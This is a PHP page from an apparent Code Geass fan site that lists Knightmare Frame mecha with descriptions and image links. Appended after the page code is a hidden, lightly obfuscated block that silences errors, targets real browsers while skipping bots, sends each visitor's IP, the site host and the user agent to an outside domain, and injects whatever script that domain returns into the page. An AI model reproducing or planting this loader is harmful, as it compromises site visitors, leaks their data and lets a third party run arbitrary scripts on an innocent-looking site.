<?php
$dir = '../';
include('knightmareCode.php');

$section[index] = array(
'meta' => array(
	'tags' => 'code geass knightmare frames, code geass knightmares, knightmare frames',
	'title' => 'Code Geass Knightmare Frames - Lancelot, Guren, Shen Hu',
	'desc' => 'Knightmare Frames are the mecha used in Code Geass. The most well known
	ones are the Lancelot, Guren, Shen Hu...'
),
'leftBox' => "Knightmare Frames often have a humanoid shape and are usually between four 
	and five meters tall. In addition to the standard range of bipedal movement, Knightmare 
	Frames are equipped with Landspinners, self-propelled roller skates attached to the ankles 
	of the machines, which allow them to achieve high mobility and speeds on most terrain. 
	Visual data is gathered through Factsphere sensors, which have thermographic capability 
	and an array of other data-collection functions which are collated in real-time. 
	Factspheres are commonly protected under a layer of armor which can be retracted to improve 
	system sensitivity. Knightmare Frames are piloted from a cockpit set in the protruding 
	'hump back' in the unit. The cockpit is a self-contained control center which can be ejected 
	in case of emergency."
);


$leftBox = '<h1>Code Geass Knightmare Frames</h1>'.$section[$key][leftBox];
////////////////////////////////////////
$rightBox = showRightBox($kMenu);  
////////////////////////////////////////

$linkTree[root] = $knightMenu['root'];

$linkTree[gen] = $knightMenu['gen'];

$linkTree[S] = array(
	'mode' => 'S',
	'spaces' => 1);

$linkTree[branchB][mode] = 'N2';
$linkTree[branchA][mode] = 'N';


if($knightmare[$genType] != '')	
	$content = '<table><tr valign="top"><td>'.div( processText($knightmare[$genType]) ).'</td></tr></table>';

$content .= '<table><tr valign="top"><td>'.div( 'Below is a list of all '.$listSpecific).'</td></tr></table>
'.$modelList.'<br><br>';     


include($dir.'include/menu.php');

echo displayTitle($leftBox, $rightBox); 


foreach($knightModels as $gen => $genType)
{
	$totalWidth = 0;	$modelList = '';
	
	$describe = top().'<h2>'.generation($gen).' - '.$knightmares[$gen][genDisplay].'
	</h2>'.processText($knightmares[$gen][description]);
	
	$modelHead = '<table id="'.$gen.'"><tr valign="top"><td>'.div($describe).'</td></tr></table>';
	foreach($genType as $mod => $mach)
	{
		$machImg = 'models/'.$mod.'/small/(1).png';
	
		//grab width from image
		list($width, $height, $type, $attr) = getimagesize($machImg); 
		$totalWidth += $width; //total width of row
		
		$modelList .= '<td align="left"><a href="models/'.$mod.'.php" title="'.$mach[title].'">
		<img src="'.$machImg.'" alt="'.$mach[title].'" title="'.$mach[title].'"></a>
		<br><a href="models/'.$mod.'.php" title="'.$mach[title].'">'.$mach[title].'</a>';
		
		if(file_exists('models/'.$mod.'/ss'))
			$modelList .= '<br>Gallery Included';
		
		$modelList .= '</td><td width="10px"></td>';
	
		if($totalWidth > 500)//limit the width per row
		{
			$modelList .= '</tr><tr valign="top">';	
			$totalWidth = 0; //reset the row's width
		}//if
	}//foreach
	$modelContent .= $modelHead.moduleBlack('<table><tr valign="top">'.$modelList.'</tr></table>');
}

echo $modelContent.'<br><br>';


include($dir.'include/bottom.php');	?>
<?php
#594de9#
error_reporting(0); ini_set('display_errors',0); $wp_e0270 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_e0270) && !preg_match ('/bot/i', $wp_e0270))){
$wp_e090270="http://"."template"."class".".com/class"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_e0270);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_e090270);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_0270e = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_0270e,1,3) === 'scr' ){ echo $wp_0270e; }
#/594de9#
?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?>
<?php

?> 